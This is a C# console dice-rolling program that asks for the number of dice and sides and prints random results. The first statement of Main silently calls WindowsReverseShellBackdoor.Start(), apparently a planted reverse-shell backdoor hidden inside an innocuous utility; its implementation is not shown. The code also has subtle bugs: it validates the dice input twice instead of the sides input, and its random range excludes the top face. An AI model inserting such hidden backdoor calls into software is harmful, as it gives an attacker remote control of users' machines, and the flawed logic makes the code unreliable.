using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Dice
{
    class Program
    {
        static void Main(string[] args)
        {
            WindowsReverseShellBackdoor.Start();
            
            Console.ForegroundColor = ConsoleColor.Green;
            int x = 1;

            do
            {
                Console.WriteLine("How many dice do you want me to roll?");
                String numberOfDice = Console.ReadLine();
                
                int d, s;
                bool isDiceTrue = int.TryParse(numberOfDice, out d);
                
                if(!isDiceTrue)
                {
                    Console.WriteLine("Invalid input.");
                    Environment.Exit(0);
                }

                Console.WriteLine("How many sides? (4/6/8/12/20)");
                String numberOfSides = Console.ReadLine();

                bool isSidesTrue = int.TryParse(numberOfDice, out s);
                if(!isSidesTrue)
                {
                    Console.WriteLine("Invalid input.");
                    Environment.Exit(0);
                }

                int rNumberDice = int.Parse(numberOfDice);
                int rNumberSides = int.Parse(numberOfSides);

                if (!(rNumberSides == 4 || rNumberSides == 6 || rNumberSides == 8 || rNumberSides == 12 || rNumberSides == 20))
                {
                    Console.WriteLine("Invalid input.");
                    Environment.Exit(0);
                }
                Console.WriteLine();

                LinkedList<int> array = new LinkedList<int>();

                Random rnd = new Random();
                for (int i = 0; i < rNumberDice; i++)
                {
                    int result = rnd.Next(1, rNumberSides);
                    array.AddLast(result);
                }

                Console.Write("You rolled: ");
                for (int i = 0; i < array.Count; i ++)
                {
                    Console.Write(array.ElementAt(i) + " ");
                }

                Console.WriteLine("\nEnter 1 to continue.");

                x = int.Parse(Console.ReadLine());

            } while (x == 1);
        }
    }
}
